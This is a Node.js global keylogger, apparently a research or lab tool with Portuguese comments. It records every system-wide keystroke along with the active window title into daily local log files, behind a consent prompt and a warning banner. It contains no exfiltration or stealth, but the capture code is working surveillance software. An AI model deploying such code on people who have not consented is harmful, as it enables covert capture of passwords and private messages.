#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const process = require('process');
const { GlobalKeyboardListener } = require('@futpib/node-global-key-listener');
const activeWin = require('active-win');

// Configurações
const CONFIG = {
    LOG_DIR: 'typing_logs',
    FILE_PREFIX: 'typing_log_',
    DEBUG: false,
    GLOBAL_CAPTURE: true,
    IGNORE_SPECIAL_KEYS: true
};

// Estado da aplicação
let currentBuffer = '';
let currentMinute = null;
let currentLogFile = null;
let sessionStartTime = null;
let flushTimer = null;
let globalListener = null;

/**
 * Formata data no formato DD/MM/YYYY
 */
function formatDate(date) {
    const day = String(date.getDate()).padStart(2, '0');
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const year = date.getFullYear();
    return `${day}/${month}/${year}`;
}

/**
 * Formata data e hora no formato DD/MM/YYYY - HH:MM:SS
 */
function formatDateTime(date) {
    const dateStr = formatDate(date);
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    return `${dateStr} - ${hours}:${minutes}:${seconds}`;
}

/**
 * Formata minuto no formato DD/MM/YYYY - HH:MM:00
 */
function formatMinute(date) {
    const dateStr = formatDate(date);
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    return `${dateStr} - ${hours}:${minutes}:00`;
}

/**
 * Gera nome do arquivo de log baseado na data
 */
function getLogFileName(date) {
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    return `${CONFIG.FILE_PREFIX}${year}-${month}-${day}.txt`;
}

/**
 * Garante que o diretório de logs existe
 */
function ensureLogDirectory() {
    if (!fs.existsSync(CONFIG.LOG_DIR)) {
        try {
            fs.mkdirSync(CONFIG.LOG_DIR, { recursive: true });
        } catch (error) {
            console.error(`Erro ao criar diretório de logs: ${error.message}`);
            process.exit(1);
        }
    }
}

/**
 * Escreve linha no arquivo de log
 */
function writeToLogFile(fileName, content) {
    const filePath = path.join(CONFIG.LOG_DIR, fileName);
    try {
        fs.appendFileSync(filePath, content + '\n', 'utf8');
        if (CONFIG.DEBUG) {
            console.log(`[DEBUG] Escrito no arquivo: ${content}`);
        }
    } catch (error) {
        console.error(`Erro ao escrever no arquivo de log: ${error.message}`);
    }
}

/**
 * Inicia uma nova sessão no arquivo de log
 */
function startSession(fileName) {
    const sessionLine = `--- Sessão iniciada em ${formatDateTime(sessionStartTime)} ---`;
    writeToLogFile(fileName, sessionLine);
}

/**
 * Finaliza a sessão no arquivo de log
 */
function endSession(fileName) {
    const sessionLine = `--- Sessão finalizada em ${formatDateTime(new Date())} ---`;
    writeToLogFile(fileName, sessionLine);
}

/**
 * Normaliza o texto removendo espaços múltiplos e fazendo trim
 */
function normalizeText(text) {
    return text.replace(/\s+/g, ' ').trim();
}

/**
 * Faz flush do buffer atual
 */
function flushBuffer() {
    if (!currentBuffer || !currentMinute) {
        return;
    }

    const normalizedText = normalizeText(currentBuffer);
    if (normalizedText.length === 0) {
        currentBuffer = '';
        return;
    }

    const now = new Date();
    const fileName = getLogFileName(currentMinute);
    
    // Se mudou de arquivo (novo dia), finaliza sessão anterior e inicia nova
    if (currentLogFile && currentLogFile !== fileName) {
        endSession(currentLogFile);
        startSession(fileName);
    } else if (!currentLogFile) {
        startSession(fileName);
    }
    
    currentLogFile = fileName;
    
    const minuteStr = formatMinute(currentMinute);
    const logLine = `${minuteStr} - ${normalizedText}`;
    
    // Escreve no arquivo e exibe no console
    writeToLogFile(fileName, logLine);
    console.log(logLine);
    
    currentBuffer = '';
}

/**
 * Processa uma tecla capturada globalmente
 */
async function processGlobalKey(event) {
    if (CONFIG.DEBUG) {
        console.log(`[DEBUG] Processando tecla global: ${event.name}`);
    }
    
    let key = '';
    
    // Mapeia teclas especiais
    if (event.name === 'RETURN' || event.name === 'ENTER') {
        key = '\n';
    } else if (event.name === 'BACKSPACE') {
        key = '\b';
    } else if (event.name === 'SPACE') {
        key = ' ';
    } else if (event.name === 'TAB') {
        key = '\t';
    } else if (event.name && event.name.length === 1) {
        // Caracteres normais (A-Z, 0-9, etc.)
        key = event.name.toLowerCase();
    } else if (CONFIG.IGNORE_SPECIAL_KEYS) {
        // Ignora teclas especiais como F1, Arrow keys, Shift, Ctrl, etc.
        if (CONFIG.DEBUG) {
            console.log(`[DEBUG] Ignorando tecla especial: ${event.name}`);
        }
        return;
    }
    
    if (key) {
        // Captura informações da janela ativa
        let activeWindow = null;
        try {
            activeWindow = await activeWin();
        } catch (error) {
            if (CONFIG.DEBUG) {
                console.log(`[DEBUG] Erro ao capturar janela ativa: ${error.message}`);
            }
        }
        
        if (CONFIG.DEBUG) {
            console.log(`[DEBUG] Chamando processKey com: "${key}"`);
            if (activeWindow) {
                console.log(`[DEBUG] Janela ativa: ${activeWindow.title} (${activeWindow.owner.name})`);
            }
        }
        processKey(key, activeWindow);
    }
}

/**
 * Processa uma tecla pressionada
 */
function processKey(key, activeWindow = null) {
    if (CONFIG.DEBUG) {
        console.log(`[DEBUG] processKey chamada com: '${key}' (charCode: ${key.charCodeAt(0)})`);
        if (activeWindow) {
            console.log(`[DEBUG] Janela ativa: ${activeWindow.title} (${activeWindow.owner.name})`);
        }
    }
    
    const now = new Date();
    const currentMinuteKey = `${now.getFullYear()}-${now.getMonth()}-${now.getDate()}-${now.getHours()}-${now.getMinutes()}`;
    
    // Se mudou de minuto, faz flush do buffer anterior
    if (currentMinute && currentMinute.getTime() !== new Date(now.getFullYear(), now.getMonth(), now.getDate(), now.getHours(), now.getMinutes()).getTime()) {
        if (CONFIG.DEBUG) {
            console.log('[DEBUG] Mudou de minuto, fazendo flush do buffer anterior');
        }
        flushBuffer();
    }
    
    currentMinute = new Date(now.getFullYear(), now.getMonth(), now.getDate(), now.getHours(), now.getMinutes());
    
    // Armazena informações da janela ativa se disponível
    if (activeWindow && activeWindow.title && activeWindow.owner && activeWindow.owner.name) {
        // Adiciona informações da janela ao buffer se mudou de aplicação
        const windowInfo = `[${activeWindow.owner.name}] ${activeWindow.title}`;
        if (!currentBuffer.includes(windowInfo)) {
            if (currentBuffer.length > 0) {
                currentBuffer += ` | ${windowInfo} → `;
            } else {
                currentBuffer = `${windowInfo} → `;
            }
        }
    }
    
    // Processa a tecla
    if (key === '\r' || key === '\n') {
        // Enter -> adiciona espaço
        currentBuffer += ' ';
        if (CONFIG.DEBUG) {
            console.log('[DEBUG] Enter detectado, adicionado espaço ao buffer');
        }
    } else if (key === '\b' || key === '\x7f') {
        // Backspace -> remove último caractere
        if (currentBuffer.length > 0) {
            currentBuffer = currentBuffer.slice(0, -1);
            if (CONFIG.DEBUG) {
                console.log('[DEBUG] Backspace detectado, removido último caractere');
            }
        }
    } else if (key.charCodeAt(0) >= 32 && key.charCodeAt(0) <= 126) {
        // Caracteres imprimíveis
        currentBuffer += key;
        if (CONFIG.DEBUG) {
            console.log(`[DEBUG] Caractere '${key}' adicionado ao buffer. Buffer atual: '${currentBuffer}'`);
        }
    } else {
        if (CONFIG.DEBUG) {
            console.log(`[DEBUG] Caractere ignorado: '${key}' (charCode: ${key.charCodeAt(0)})`);
        }
    }
    
    // Agenda flush para o final do minuto se ainda não agendado
    if (flushTimer) {
        clearTimeout(flushTimer);
    }
    
    const secondsUntilNextMinute = 60 - now.getSeconds();
    if (CONFIG.DEBUG) {
        console.log(`[DEBUG] Agendando flush em ${secondsUntilNextMinute} segundos`);
    }
    flushTimer = setTimeout(() => {
        if (CONFIG.DEBUG) {
            console.log('[DEBUG] Timer de flush executado');
        }
        flushBuffer();
        flushTimer = null;
    }, secondsUntilNextMinute * 1000);
}

/**
 * Configura captura de teclas global
 */
function setupKeyCapture() {
    // Handler para Ctrl+C em qualquer modo
    process.on('SIGINT', () => {
        console.log('\nCtrl+C detectado via SIGINT...');
        gracefulExit();
    });
    
    if (CONFIG.GLOBAL_CAPTURE) {
        try {
            console.log('[DEBUG] Criando GlobalKeyboardListener...');
            globalListener = new GlobalKeyboardListener();
            console.log('[DEBUG] GlobalKeyboardListener criado com sucesso');
            
            globalListener.addListener(function (e, down) {
                console.log(`[DEBUG] Evento capturado: ${JSON.stringify({name: e.name, state: e.state, rawKey: e.rawKey, ctrlKey: e.ctrlKey})}`);
                
                if (e.state === 'DOWN') {
                    // Múltiplas formas de detectar Ctrl+C
                    if ((e.name === 'C' || e.name === 'c') && (e.ctrlKey || e.metaKey)) {
                        console.log('\nCtrl+C detectado via listener global...');
                        gracefulExit();
                        return;
                    }
                    
                    // ESC como alternativa para sair
                    if (e.name === 'ESCAPE') {
                        console.log('\nESC pressionado - saindo...');
                        gracefulExit();
                        return;
                    }
                    
                    // Processa a tecla
                    processGlobalKey(e);
                }
            });
            
            console.log('[DEBUG] Listener adicionado com sucesso');
            console.log('Captura global de teclas ativada.');
            console.log('Para sair: Ctrl+C ou ESC');
            console.log('[DEBUG] Digite algumas teclas para testar...');
        } catch (error) {
            console.error('[ERROR] Falha ao inicializar captura global:', error.message);
            console.log('[DEBUG] Tentando fallback para modo local...');
            CONFIG.GLOBAL_CAPTURE = false;
            setupKeyCapture();
            return;
        }
    } else {
        console.log('[DEBUG] Usando modo local (stdin)');
        // Fallback para captura local (stdin)
        process.stdin.setRawMode(true);
        process.stdin.resume();
        process.stdin.setEncoding('utf8');
        
        process.stdin.on('data', (key) => {
            if (key === '\u0003') {
                gracefulExit();
                return;
            }
            processKey(key);
        });
        
        console.log('Captura local ativada. Digite no terminal e pressione Ctrl+C para sair.');
    }
}

/**
 * Saída limpa da aplicação
 */
function gracefulExit() {
    console.log('\n\nFinalizando logger...');
    
    // Faz flush do buffer final
    flushBuffer();
    
    // Finaliza sessão
    if (currentLogFile) {
        endSession(currentLogFile);
    }
    
    // Limpa timer se existir
    if (flushTimer) {
        clearTimeout(flushTimer);
    }
    
    // Para o listener global se estiver ativo
    if (globalListener) {
        globalListener.kill();
        globalListener = null;
    }
    
    // Restaura modo normal do terminal se necessário
    if (!CONFIG.GLOBAL_CAPTURE) {
        process.stdin.setRawMode(false);
        process.stdin.pause();
    }
    
    console.log('Logger finalizado.');
    process.exit(0);
}

/**
 * Exibe aviso inicial e pede consentimento
 */
function showInitialWarning() {
    console.log('🔍 Awesome Keylogger — CAPTURA GLOBAL DE TECLAS ATIVADA');
    console.log('⚠️  AVISO: Este programa captura TODAS as teclas digitadas no sistema!');
    console.log('📝 Use apenas para fins de pesquisa/laboratório na sua própria máquina.');
    console.log('🚫 NÃO digite senhas ou informações sensíveis enquanto estiver ativo.');
    console.log('💾 Todos os dados são salvos localmente em: ' + CONFIG.LOG_DIR);
    console.log('');
    console.log('🔐 CONSENTIMENTO NECESSÁRIO:');
    console.log('Pressione ENTER para CONFIRMAR e iniciar a captura global ou Ctrl+C para cancelar.');
    console.log('');
    
    process.stdin.setRawMode(true);
    process.stdin.resume();
    process.stdin.setEncoding('utf8');
    
    process.stdin.on('data', (key) => {
        if (key === '\r' || key === '\n') {
            process.stdin.setRawMode(false);
            process.stdin.pause();
            
            console.log('✅ Consentimento confirmado!');
            console.log('🚀 Iniciando captura global de teclas...');
            console.log('🌍 Capturando teclas de TODO o sistema!');
            console.log('⏹️  Pressione Ctrl+C para finalizar.');
            console.log('');
            
            startLogger();
        } else if (key === '\u0003') {
            console.log('\n❌ Cancelado pelo usuário.');
            process.exit(0);
        }
    });
}

/**
 * Inicia o logger
 */
function startLogger() {
    sessionStartTime = new Date();
    ensureLogDirectory();
    
    // Configura handlers de sinal
    process.on('SIGINT', gracefulExit);
    process.on('SIGTERM', gracefulExit);
    
    // Inicia captura de teclas
    setupKeyCapture();
}

/**
 * Função principal
 */
function main() {
    showInitialWarning();
}

// Inicia a aplicação
if (require.main === module) {
    main();
}

module.exports = {
    formatDate,
    formatDateTime,
    formatMinute,
    normalizeText
};